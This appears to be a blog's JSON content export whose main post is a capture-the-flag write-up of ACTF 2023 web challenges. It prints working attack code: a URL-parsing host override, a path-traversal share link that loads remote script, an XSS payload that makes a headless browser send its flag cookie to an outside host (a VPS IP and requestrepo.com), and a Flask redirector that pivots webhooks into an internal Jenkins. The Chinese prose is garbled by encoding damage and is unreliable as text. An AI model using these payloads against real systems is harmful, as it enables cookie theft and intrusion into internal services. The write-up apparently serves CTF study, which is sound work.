{"meta":{"title":"å…‰è¾‰çš„blogå•¦~~","subtitle":"","description":"","author":"1llustrious","url":"https://1llustrious.github.io","root":"/"},"pages":[{"title":"links","date":"2023-12-01T00:12:08.000Z","updated":"2023-12-01T00:36:51.320Z","comments":true,"path":"links/index.html","permalink":"https://1llustrious.github.io/links/index.html","excerpt":"","text":""},{"title":"about","date":"2023-12-01T07:41:57.000Z","updated":"2023-12-01T07:50:52.597Z","comments":true,"path":"about/index.html","permalink":"https://1llustrious.github.io/about/index.html","excerpt":"","text":"åšå®¢ç®€ä»‹ æ²¡ä»€ä¹ˆå¥½ä»‹ç»çš„ï¼Œèœç‹—èŒæ–°ä¸€ä¸ªğŸ˜­, åŒ—äº¬æŸé«˜æ ¡ä¸çŸ¥åçš„ webğŸ•ä¸€æ¡ï¼Œå¸ˆå‚…ä»¬æ‰‹ä¸‹ç•™æƒ…ï¼Œç›®å‰éš¶å±äº 0psu3 æˆ˜é˜Ÿï¼Œä½†ä¹Ÿåªæ˜¯è´Ÿè´£ç«¯èŒ¶å€’æ°´çš„ç±»å‹. æˆ‘çš„ id æ˜¯ 1llustrious, æ¥æºäºå…‰è¾‰å·èˆªç©ºæ¯èˆ°ï¼Œæ²¡é”™ï¼Œæœ¬äººå–œçˆ±å…‰è¾‰. å‰èº«æ˜¯å‘å¾®çš„æ—®æ—¯ç©å®¶ï¼Œæ‰€ä»¥ä½ ä¼šåœ¨æˆ‘çš„åšå®¢ä¸­çœ‹åˆ°å„ç§æ—®æ—¯è¦ç´ . æˆ‘çš„åšå®¢ä¸»è¦ç”¨äºè®°å½•ä¸€äº›å­¦ä¹ çš„å†…å®¹å’Œç”Ÿæ´»ï¼Œå¶å°”æˆ‘å¿ƒæƒ…ä¸å¥½çš„æ—¶å€™ï¼Œï½ï½æ€§æƒ…å¤§å‘ (ä¸æ˜¯)~~ å°±ä¼šå†™ç‚¹éå¸¸é€†å¤©çš„è¯ï¼ŒåŒæ—¶ä½¿ç”¨å¤§é‡æŠ½è±¡çš„ emoji, ä¹Ÿä¸çŸ¥é“è·Ÿè°å­¦çš„. è¿˜è¯·å¸ˆå‚…ä»¬æ‰‹ä¸‹ç•™æƒ…ï¼Œæœ¬äººæ–‡ç« å¤šå°‘æœ‰ç‚¹ç‘•ç–µï¼Œå¸Œæœ›è½»ç‚¹å–·ğŸ˜­ğŸ˜­ğŸ˜­ğŸ˜­"}],"posts":[{"title":"ACTF-å¤ç°","slug":"ACTF-å¤ç°","date":"2023-12-02T00:12:41.000Z","updated":"2023-12-02T01:10:19.566Z","comments":true,"path":"2023/12/02/ACTF-å¤ç°/","link":"","permalink":"https://1llustrious.github.io/2023/12/02/ACTF-%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"å†™åœ¨å‰é¢ easy latex new URL ç‰¹æ€§ğŸ˜‚ è¿ç”¨åˆ°é¢˜ç›®ğŸ¤ª visit è§¦å‘ hooks what is webhookğŸ¤” Abusing Jenkins login å¼€æ‰“ğŸ˜¤ ~Ave Mujicaâ€™s Masquerade~ æºç ï¼Œå†²ğŸ˜“ story æºç ğŸ¤” å†™åœ¨å‰é¢ å‘œå‘œå‘œï¼Œshanhegiegie å¤ªçŒ›äº†ï¼Œæ‰“äº†ä¸€å¤©æ‡’çŒ«ï¼Œç¬¬äºŒå¤©è¿˜è¦ä¸Šè¯¾ï¼Œå‘¨å…­è¡¥è¯¾ï¼Œæ˜¯è°å•Šï¼ŒåŸæ¥æ˜¯ğŸ‘´å•Šï¼Œé‚£æ²¡äº‹äº† (nmsl). å‚è€ƒ: https://wm-ctf-team.feishu.cn/docx/PLbbdhwdyoAefuxokXwcYppzn1c å¾®ä¿¡å…¬ä¼—å¹³å° (qq.com) easy latex new URL ç‰¹æ€§ğŸ˜‚ å…ˆæ¥ä¸ªå° demo 1234const username = &quot;43.143.192.19:1145&quot;const vip_url = &quot;http://vip:5000/&quot;console.log(new URL(username,vip_url)) å¦‚æ­¤ï¼Œpathname æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œhost æ˜¯æˆ‘ä»¬çš„ç¬¬äºŒä¸ªå‚æ•°. å€˜è‹¥æˆ‘ç¬¬ä¸€ä¸ªå‚æ•°å‰é¢åŠ  \\\\ æˆ–æ˜¯ //, é˜ä¸‹åˆå½“å¦‚ä½•åº”å¯¹ğŸ˜“. 12345const username = &quot;\\\\\\\\43.143.192.19:1145&quot;//const username = &quot;//43.143.192.19:1145&quot;const vip_url = &quot;http://vip:5000/&quot;console.log(new URL(username,vip_url)) å–œæ¬¢æˆ‘ç»•è¿‡æ±¡æŸ“ host å—ğŸ˜› è¿ç”¨åˆ°é¢˜ç›®ğŸ¤ª ä¸å¤š bb, æºç é‰´èµä¸€æ³¢ 123456789101112app.get(&#x27;/preview&#x27;, (req, res) =&gt; &#123; let &#123; tex, theme &#125; = req.query if (!tex) &#123; tex = &#x27;Today is \\\\today.&#x27; &#125; const nonce = getNonce(16) let base = &#x27;https://cdn.jsdelivr.net/npm/latex.js/dist/&#x27; if (theme) &#123; base = new URL(theme, `http://$&#123;req.headers.host&#125;/theme/`) + &#x27;/&#x27; &#125; res.render(&#x27;preview.html&#x27;, &#123; tex, nonce, base &#125;)&#125;) æˆ‘ç›´æ¥ theme ä¸Šæ”¾å…¥æˆ‘çš„ vps, è¿œç¨‹åŠ è½½å¥¥è¥¿ç»™ 1preview?tex=asd&amp;theme=//43.143.192.19:1145 ç»ä¸€æ ¼å¾·æ‹‰ç±³çš„æµ‹è¯•ğŸ˜¤,wcsndm, å°±ç®—å•¥è·¯å¾„éƒ½ä¸åŠ ä»–éƒ½ä¼šè®¿é—® /js/base.js, è¿™å¾ˆä¸è‡ªç”±ğŸ¤”. æ²¡å…³ç³»ï¼Œç›´æ¥åœ¨ vps èµ·ä¸€ä¸ªä¸€æ¨¡ä¸€æ ·çš„ emoji,ğŸ‘´çœŸæ˜¯ä¸ªå¤©æ‰. 1alert(&#x27;wcsndm&#x27;); /var/www/html/base/base.js æ”¾ä¸Šè¿™ä¸ªä»£ç ï¼Œæµ‹è¯•ä¸€æ³¢ï¼Œè®©æˆ‘ç‹ ç‹ åœ°æµ‹ï¼ï¼ï¼ğŸ¥µ æ¬§å†…çš„æ‰‹ï¼Œå¥½æ±‰ï¼Œå¥¥è¥¿ç»™ï¼Œçˆ½çš„é›…ç—ï¼Œæ¯”ğŸå‡ºæ¥è¿˜çˆ½. visit è§¦å‘ ä¸å¤š bb, ä¸Šæºç  123456789101112131415app.get(&#x27;/share/:id&#x27;, reportLimiter, async (req, res) =&gt; &#123; const &#123; id &#125; = req.params if (!id) &#123; res.send(&#x27;no note id specified&#x27;) return &#125; const url = `http://localhost:$&#123;PORT&#125;/note/$&#123;id&#125;` try &#123; await visit(url) res.send(&#x27;done&#x27;) &#125; catch (e) &#123; console.log(e) res.send(&#x27;something error&#x27;) &#125;&#125;) 123456789101112131415161718192021222324252627const visit = async (url) =&gt; &#123; console.log(`start: $&#123;url&#125;`) const browser = await puppeteer.launch(&#123; headless: &#x27;new&#x27;, executablePath: &#x27;/usr/bin/google-chrome-stable&#x27;, args: [&#x27;--no-sandbox&#x27;], &#125;) const ctx = await browser.createIncognitoBrowserContext(); try&#123; const page = await ctx.newPage(); await page.setCookie(&#123; name: &#x27;flag&#x27;, value: FLAG, domain: `$&#123;APP_HOST&#125;:$&#123;APP_PORT&#125;`, httpOnly: true &#125;) await page.goto(url, &#123;timeout: 5000&#125;) await sleep(3000) await page.close() &#125;catch(e)&#123; console.log(e); &#125; await ctx.close(); await browser.close() console.log(`done: $&#123;url&#125;`)&#125; é‚£ä¹ˆä¼—æ‰€å‘¨çŸ¥ï¼Œvisit å°±æ˜¯èƒ½å¤Ÿè‡ªè¡Œæ‰“å¼€æµè§ˆå™¨å¹¶ä¸”è®¿é—®ï¼Œä¸çŸ¥é“çš„è¯ä¸Šç½‘æŸ¥ï¼Œåˆ«é—®ğŸ‘´. 123456789101112131415161718app.post(&#x27;/vip&#x27;, auth, async (req, res) =&gt; &#123; let username = req.session.username let &#123; code &#125; = req.body let vip_url = VIP_URL let data = await (await fetch(new URL(username, vip_url), &#123; method: &#x27;POST&#x27;, headers: &#123; Cookie: Object.entries(req.cookies).map(([k, v]) =&gt; `$&#123;k&#125;=$&#123;v&#125;`).join(&#x27;; &#x27;) &#125;, body: new URLSearchParams(&#123; code &#125;) &#125;)).text() if (&#x27;ok&#x27; == data) &#123; res.cookie(&#x27;token&#x27;, sign(&#123; username, isVip: true &#125;)) res.send(&#x27;Congratulation! You are VIP now.&#x27;) &#125; else &#123; res.send(data) &#125;&#125;) è€Œè¿™ä¸ª visit, æ‰“å¼€æµè§ˆå™¨è®¿é—®ï¼ŒğŸªé‡Œé¢æ˜¯æºå¸¦ç€ flag, æ‰€ä»¥ğŸ‘´è¦æ‹¿åˆ°è¿™ä¸ªğŸª. ä½†æ˜¯ flag ä¸ä¸€å®šèƒ½å¤Ÿä¼ æ¥ï¼Œè€Œ vip è·¯ç”±èƒ½å¤Ÿå¼ºåˆ¶è®© Cookie æºå¸¦å°±å¾ˆå¥½âœŒ ä¸è¿‡ç›´æ¥è®¿é—®æ˜¯æ‹¿ä¸åˆ°çš„ï¼Œæ€ä¹ˆåŠæï¼Œxss è¿‡æ¥ï¼ 1/shareè·¯ç”±new urlè®¿é—®-&gt;/previewè·¯ç”±è¿›è¡Œnew url xss-&gt;åŠ è½½vpsæ¶æ„js-&gt;ä»¥å¸¦ğŸªçš„èº«ä»½è®¿é—®/loginå’Œ/vip,è§¦å‘vipçš„fetchè®¿é—®-&gt;å°†ğŸªæ•°æ®è½¬åˆ°xsså¹³å°. ä½¿ç”¨ urlencode 12/share/%2e%2e%2f%70%72%65%76%69%65%77%3f%74%65%78%3d%61%77%64%61%64%61%77%64%26%74%68%65%6d%65%3d%2f%2f%34%33%2e%31%34%33%2e%31%39%32%2e%31%39%3a%31%31%34%35/share/../preview?tex=awdadawd&amp;theme=//43.143.192.19:1145 ç›®å½•ç©¿è¶Šå¤§æ³•è®¿é—® preview, è‡³äºä¸ºå•¥ç”¨ url ç¼–ç ï¼Œå› ä¸ºæ˜¯æ¥åœ¨è·¯å¾„ä¹‹åçš„ï¼Œå®¹æ˜“è¢«è§£ææˆè·¯å¾„è€Œä¸æ˜¯ä¼ é€’çš„å‚æ•°. js ä¸Šæ”¾ä¸¶ä¸œè¥¿ 12345678910111213141516171819202122232425262728293031323334353637const login = &#x27;/login&#x27;;const vip = &#x27;/vip&#x27;;const loginreq = new URLSearchParams(&#123; username: &#x27;//z08vedyv.requestrepo.com&#x27;, password: &#x27;7bbf4ac9596b5662b44db993bd8050dd&#x27;,&#125;);const changshu = &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#125;, body: loginreq,&#125;;async function evil() &#123; try &#123; const loginrep = await fetch(login, changshu); if (loginrep.ok) &#123; const vipResponse = await fetch(vip, &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#125;, body: new URLSearchParams(&#123; code: &quot;awdawdwadwadwadwa&quot; &#125;), credentials: &#x27;include&#x27;, &#125;); // åœ¨è¿™é‡Œä½ å¯ä»¥å¤„ç†vipResponse &#125; else &#123; // åœ¨è¿™é‡Œå¤„ç†ç™»å½•å¤±è´¥çš„æƒ…å†µ &#125; &#125; catch (error) &#123; console.error(error); &#125;&#125;evil(); ğŸ‘´çˆ±ä½¿ç”¨ Dashboard - requestrepo.com æ”¶ cookies cnm ä¸å¥½ç”¨ï¼Œè¿˜æ˜¯ vps å¾—åŠ² eeeeeeeeeeeeeeez, ã‚‚ã‚ã„ã‚‚ã‚ã„ã€‚ æœ€å¾Œã® exp æ”¹ 12345678910111213141516171819202122232425262728293031323334353637const login = &#x27;/login&#x27;;const vip = &#x27;/vip&#x27;;const loginreq = new URLSearchParams(&#123; username: &#x27;//43.143.192.19:7777&#x27;, password: &#x27;9aaf577e773320b3548fdc5f37aa6e74&#x27;&#125;);const changshu = &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#125;, body: loginreq,&#125;;async function evil() &#123; try &#123; const loginrep = await fetch(login, changshu); if (loginrep.ok) &#123; const vipResponse = await fetch(vip, &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;, &#125;, body: new URLSearchParams(&#123; code: &quot;awdawdwadwadwadwa&quot; &#125;), credentials: &#x27;include&#x27;, &#125;); // åœ¨è¿™é‡Œä½ å¯ä»¥å¤„ç†vipResponse &#125; else &#123; // åœ¨è¿™é‡Œå¤„ç†ç™»å½•å¤±è´¥çš„æƒ…å†µ &#125; &#125; catch (error) &#123; console.error(error); &#125;&#125;evil(); ç°åœ¨ï¼ŒğŸ‘´å°±æ˜¯æ–°ä¸–ç•Œã®å¡å¯†. hooks https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/ what is webhookğŸ¤” Webhook æ˜¯ä¸€ç§é€šè¿‡ HTTP åè®®å®ç°çš„å›è°ƒæœºåˆ¶ï¼Œç”¨äºå°†å®æ—¶äº‹ä»¶å’Œæ•°æ®ä»ä¸€ä¸ªåº”ç”¨ç¨‹åºä¼ é€’åˆ°å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºã€‚Webhook å…è®¸åº”ç”¨ç¨‹åºåœ¨ç‰¹å®šäº‹ä»¶å‘ç”Ÿæ—¶è‡ªåŠ¨é€šçŸ¥å…¶ä»–åº”ç”¨ç¨‹åºï¼Œè¿™ç§é€šçŸ¥æ˜¯é€šè¿‡ HTTP POST è¯·æ±‚è¿›è¡Œçš„ã€‚å®ƒæ˜¯ä¸€ç§ç”¨äºå®ç°å®æ—¶é€šä¿¡å’Œæ•°æ®ä¼ é€’çš„è½»é‡çº§æœºåˆ¶ã€‚ ä»¥ä¸‹æ˜¯ Webhook çš„ä¸»è¦ç‰¹ç‚¹å’Œç”¨é€”ï¼š äº‹ä»¶é©±åŠ¨é€šçŸ¥ï¼š Webhook ä¸»è¦ç”¨äºäº‹ä»¶é©±åŠ¨çš„é€šçŸ¥ï¼Œä¾‹å¦‚æ–°çš„è®¢å•ã€æ–°çš„æ¶ˆæ¯ã€çŠ¶æ€æ›´æ”¹ç­‰ã€‚å½“ç‰¹å®šäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œæºåº”ç”¨ç¨‹åºå°†å‘é€ HTTP POST è¯·æ±‚åˆ°ç›®æ ‡åº”ç”¨ç¨‹åºçš„ Webhook URLï¼Œé€šçŸ¥ç›®æ ‡åº”ç”¨ç¨‹åºè¿›è¡Œå“åº”ã€‚ å®æ—¶æ€§ï¼š Webhook é€šå¸¸å…·æœ‰ä½å»¶è¿Ÿï¼Œå› ä¸ºå®ƒä»¬æ˜¯å³æ—¶è§¦å‘çš„ã€‚å½“äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œé€šçŸ¥ç«‹å³å‘é€ï¼Œè€Œä¸éœ€è¦è½®è¯¢æˆ–å®šæœŸæ£€æŸ¥ã€‚ è‡ªåŠ¨åŒ–ï¼š Webhook å…è®¸è‡ªåŠ¨åŒ–å¤„ç†äº‹ä»¶å’Œæ•°æ®ï¼Œå‡å°‘äº†æ‰‹åŠ¨å¹²é¢„çš„éœ€è¦ã€‚è¿™å¯¹äºé›†æˆä¸åŒåº”ç”¨ç¨‹åºã€è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹å’Œæé«˜æ•ˆç‡éå¸¸æœ‰ç”¨ã€‚ æ‰©å±•æ€§ï¼š Webhook å¯ä»¥ä¸å„ç§ä¸åŒç±»å‹çš„åº”ç”¨ç¨‹åºå’ŒæœåŠ¡é›†æˆï¼Œä½¿å…¶å…·æœ‰å¾ˆé«˜çš„çµæ´»æ€§å’Œæ‰©å±•æ€§ã€‚ æ•°æ®ä¼ é€’ï¼š Webhook å¯ä»¥ä¼ é€’å„ç§æ•°æ®æ ¼å¼ï¼ŒåŒ…æ‹¬ JSONã€XMLã€è¡¨å•æ•°æ®ç­‰ï¼Œè¿™ä½¿å¾—å®ƒä»¬é€‚ç”¨äºå¤šç§åº”ç”¨åœºæ™¯ã€‚ é‡ç‚¹ğŸ¤ª:webhook åªå…è®¸æˆ‘ä»¬å‘é€ POST è¯·æ±‚ï¼Œæ²¡æ³•æ§åˆ¶è¯·æ±‚çš„ body, ç”šè‡³æ²¡æœ‰ csrf çš„ tokenğŸ˜“ Abusing Jenkins login ä¸è¯´äººè¯: Jenkins æ˜¯ä¸€ä¸ªå¼€æºçš„è‡ªåŠ¨åŒ–æœåŠ¡å™¨ï¼Œç”¨äºæ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²è½¯ä»¶é¡¹ç›®ã€‚å®ƒæä¾›äº†ä¸€ä¸ªçµæ´»çš„å¹³å°ï¼Œä½¿å›¢é˜Ÿèƒ½å¤Ÿè‡ªåŠ¨åŒ–æ•´ä¸ªè½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­çš„å„ç§ä»»åŠ¡ã€‚ä»¥ä¸‹æ˜¯ Jenkins çš„ä¸»è¦ç‰¹ç‚¹å’Œç”¨é€”ï¼š æŒç»­é›†æˆ (CI) å’ŒæŒç»­äº¤ä»˜ (CD)ï¼š Jenkins é€šè¿‡è‡ªåŠ¨åŒ–æ„å»ºå’Œæµ‹è¯•è¿‡ç¨‹ï¼Œæ”¯æŒæŒç»­é›†æˆå’ŒæŒç»­äº¤ä»˜ï¼Œä½¿å›¢é˜Ÿèƒ½å¤Ÿé¢‘ç¹åœ°ã€å¯é åœ°äº¤ä»˜è½¯ä»¶ã€‚ æ’ä»¶ç”Ÿæ€ç³»ç»Ÿï¼š Jenkins å…·æœ‰å¼ºå¤§çš„æ’ä»¶ç”Ÿæ€ç³»ç»Ÿï¼Œå…è®¸ç”¨æˆ·è½»æ¾åœ°æ‰©å±•å…¶åŠŸèƒ½ã€‚æœ‰æ•°åƒä¸ªå¯ç”¨çš„æ’ä»¶ï¼Œç”¨äºä¸å„ç§å·¥å…·å’ŒæŠ€æœ¯è¿›è¡Œé›†æˆã€‚ åˆ†å¸ƒå¼æ„å»ºï¼š Jenkins æ”¯æŒåˆ†å¸ƒå¼æ„å»ºï¼Œå¯ä»¥å°†æ„å»ºä»»åŠ¡åˆ†å‘åˆ°å¤šä¸ªæ„å»ºä»£ç† (Nodes)ï¼Œä»¥æé«˜æ„å»ºæ€§èƒ½å’Œå¯æ‰©å±•æ€§ã€‚ è‡ªåŠ¨åŒ–éƒ¨ç½²ï¼š Jenkins å¯ä»¥ä¸å„ç§éƒ¨ç½²å·¥å…·å’Œäº‘å¹³å°é›†æˆï¼Œæ”¯æŒè‡ªåŠ¨åŒ–éƒ¨ç½²åˆ°ä¸åŒç¯å¢ƒï¼ŒåŒ…æ‹¬å¼€å‘ã€æµ‹è¯•å’Œç”Ÿäº§ç¯å¢ƒã€‚ å¯è§†åŒ–ç•Œé¢ï¼š Jenkins æä¾›ç›´è§‚çš„ Web ç”¨æˆ·ç•Œé¢ï¼Œç”¨äºç®¡ç†æ„å»ºä»»åŠ¡ã€æŸ¥çœ‹æ„å»ºå†å²å’Œç”ŸæˆæŠ¥å‘Šã€‚ å¤šç§æ„å»ºå·¥å…·æ”¯æŒï¼š Jenkins å¯ä»¥ä¸å„ç§æ„å»ºå·¥å…·é›†æˆï¼ŒåŒ…æ‹¬ Apache Antã€Mavenã€Gradle ç­‰ã€‚ å¤šè¯­è¨€æ”¯æŒï¼š Jenkins æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€å’ŒæŠ€æœ¯æ ˆï¼Œä½¿å…¶é€‚ç”¨äºå„ç§é¡¹ç›®ã€‚ å®‰å…¨æ€§å’Œæƒé™æ§åˆ¶ï¼š Jenkins å…·æœ‰å¼ºå¤§çš„å®‰å…¨æ€§å’Œæƒé™æ§åˆ¶åŠŸèƒ½ï¼Œå¯ä»¥ç®¡ç†ç”¨æˆ·å’Œè§’è‰²çš„è®¿é—®æƒé™ã€‚ æ—¥å¿—è®°å½•å’ŒæŠ¥å‘Šï¼š Jenkins ç”Ÿæˆè¯¦ç»†çš„æ„å»ºæ—¥å¿—å’ŒæŠ¥å‘Šï¼Œä»¥ä¾¿è¯Šæ–­é—®é¢˜å’Œè¿½è¸ªæ„å»ºè¿›åº¦ã€‚ æ´»è·ƒçš„ç¤¾åŒºå’Œæ”¯æŒï¼š Jenkins æ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œæœ‰ä¸€ä¸ªæ´»è·ƒçš„ç¤¾åŒºï¼Œæä¾›æ”¯æŒã€æ–‡æ¡£å’Œæ’ä»¶ã€‚ è¯´äººè¯:ğŸ‘´ä¹Ÿä¸çŸ¥é“ ä¸€ç§ç»•è¿‡å®ƒä»¬çš„æ–¹æ³•ï¼Œä»ç™»å½•é¡µé¢å¼€å§‹ã€‚æˆ‘ä»¬å¯ä»¥å°è¯•æš´åŠ›ç ´è§£ç”¨æˆ·å‡­æ®ï¼Œå› ä¸º Jenkins ç”¨æˆ·åœ¨å…¶è‡ªå·±çš„ç”¨æˆ·æ•°æ®åº“ä¸­è¿›è¡Œç®¡ç†ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–ç¼ºä¹åŸºæœ¬ä¿æŠ¤ï¼ˆä¾‹å¦‚å¯†ç ç­–ç•¥æˆ–é’ˆå¯¹è‡ªåŠ¨åŒ–çš„ä¿æŠ¤ï¼‰çš„ç”¨æˆ·ç®¡ç†æ–¹æ³•ï¼Œè¿™æ˜¯å¾ˆå¸¸è§çš„ã€‚(æœºç¿»ï¼ŒğŸ‘´çœ‹ä¸æ‡‚ğŸæ–‡) æ€»è€Œè¨€ä¹‹å°±æ˜¯ï¼Œé€šè¿‡ github æˆ– gitlab çš„ webhooks ç»è¿‡ python ä¸­è½¬ï¼Œæ‰“åˆ°é¢˜ç›®çš„å†…ç½‘. ğŸ‘´çœŸ tm æ˜¯ä¸ª sb, çœ‹ä¸ªæ–‡ç« æ²¡çœ‹å…¨ï¼ŒæŠŠä¸€éƒ¨åˆ† exp æ‹¿å»æ‰“ï¼Œæ­»æ´»æ‰“ä¸é€šï¼Œåæ¥é—®â›°ğŸŒŠgiegie, æ‰çŸ¥é“è¦é€šè¿‡ python å†™ä¸ªé‡å®šå‘ä¸­è½¬æ‰èƒ½æœ‰å›æ˜¾ï¼Œè¯´æ˜¯æœ‰è§†é¢‘æ¼”ç¤ºï¼ŒğŸ‘´tmğŸ‡äº†ï¼Œæ²¡è¿™ä¹ˆ sb å§ï¼Œé˜¿ç±³è¯ºæ–¯. å¼€æ‰“ğŸ˜¤ 1234567from flask import Flask,redirectapp = Flask(__name__)@app.route(&#x27;/evil&#x27;, methods=[&#x27;POST&#x27;])def evil(): return redirect(&quot;http://124.70.33.170:8088/redirect?redirect_url=http://jenkins:8080/&quot;,code=302)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=7777) 123456&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head resURL=&quot;/static/e1c81722&quot; data-rooturl=&quot;&quot; data-resurl=&quot;/static/e1c81722&quot;&gt; &lt;title&gt;Dashboard [Jenkins]&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/css/layout-common.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/css/style.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/css/color.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/css/responsive-grid.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;shortcut icon&quot; href=&quot;/static/e1c81722/favicon.ico&quot; type=&quot;image/vnd.microsoft.icon&quot; /&gt;&lt;link color=&quot;black&quot; rel=&quot;mask-icon&quot; href=&quot;/images/mask-icon.svg&quot; /&gt;&lt;script&gt;var isRunAsTest=false; var rootURL=&quot;&quot;; var resURL=&quot;/static/e1c81722&quot;;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/prototype.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/behavior.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&#x27;/adjuncts/e1c81722/org/kohsuke/stapler/bind.js&#x27; type=&#x27;text/javascript&#x27;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/yahoo/yahoo-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/dom/dom-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/event/event-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/animation/animation-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/dragdrop/dragdrop-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/container/container-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/connection/connection-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/datasource/datasource-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/autocomplete/autocomplete-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/menu/menu-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/element/element-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/button/button-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/storage/storage-min.js&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/hudson-behavior.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script src=&quot;/static/e1c81722/scripts/sortable.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;script&gt;crumb.init(&quot;&quot;, &quot;&quot;);&lt;/script&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/container/assets/container.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/assets/skins/sam/skin.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/container/assets/skins/sam/container.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/button/assets/skins/sam/button.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/e1c81722/scripts/yui/menu/assets/skins/sam/menu.css&quot; type=&quot;text/css&quot; /&gt;&lt;link rel=&quot;search&quot; href=&quot;/opensearch.xml&quot; type=&quot;application/opensearchdescription+xml&quot; title=&quot;Jenkins&quot; /&gt;&lt;meta name=&quot;ROBOTS&quot; content=&quot;INDEX,NOFOLLOW&quot; /&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;&lt;link rel=&quot;alternate&quot; href=&quot;/rssAll&quot; title=&quot;Jenkins:all (all builds)&quot; type=&quot;application/rss+xml&quot; /&gt;&lt;link rel=&quot;alternate&quot; href=&quot;/rssAll?flavor=rss20&quot; title=&quot;Jenkins:all (all builds) (RSS 2.0)&quot; type=&quot;application/rss+xml&quot; /&gt;&lt;link rel=&quot;alternate&quot; href=&quot;/rssFailed&quot; title=&quot;Jenkins:all (failed builds)&quot; type=&quot;application/rss+xml&quot; /&gt;&lt;link rel=&quot;alternate&quot; href=&quot;/rssFailed?flavor=rss20&quot; title=&quot;Jenkins:all (failed builds) (RSS 2.0)&quot; type=&quot;application/rss+xml&quot; /&gt;&lt;script src=&quot;/static/e1c81722/scripts/yui/cookie/cookie-min.js&quot;&gt;&lt;/script&gt;&lt;script&gt; YAHOO.util.Cookie.set(&quot;screenResolution&quot;, screen.width+&quot;x&quot;+screen.height); &lt;/script&gt;&lt;script src=&quot;/static/e1c81722/jsbundles/page-init.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body data-model-type=&quot;hudson.model.AllView&quot; id=&quot;jenkins&quot; class=&quot;yui-skin-sam two-column jenkins-2.138&quot; data-version=&quot;2.138&quot;&gt;&lt;a href=&quot;#skip2content&quot; class=&quot;skiplink&quot;&gt;Skip to content&lt;/a&gt;&lt;div id=&quot;page-head&quot;&gt;&lt;div id=&quot;header&quot;&gt;&lt;div class=&quot;logo&quot;&gt;&lt;a id=&quot;jenkins-home-link&quot; href=&quot;/&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/headshot.png&quot; alt=&quot;[Jenkins]&quot; id=&quot;jenkins-head-icon&quot; /&gt;&lt;img src=&quot;/static/e1c81722/images/title.png&quot; alt=&quot;Jenkins&quot; width=&quot;139&quot; id=&quot;jenkins-name-icon&quot; height=&quot;34&quot; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;login&quot;&gt; &lt;a href=&quot;/login?from=%2F&quot;&gt;&lt;b&gt;log 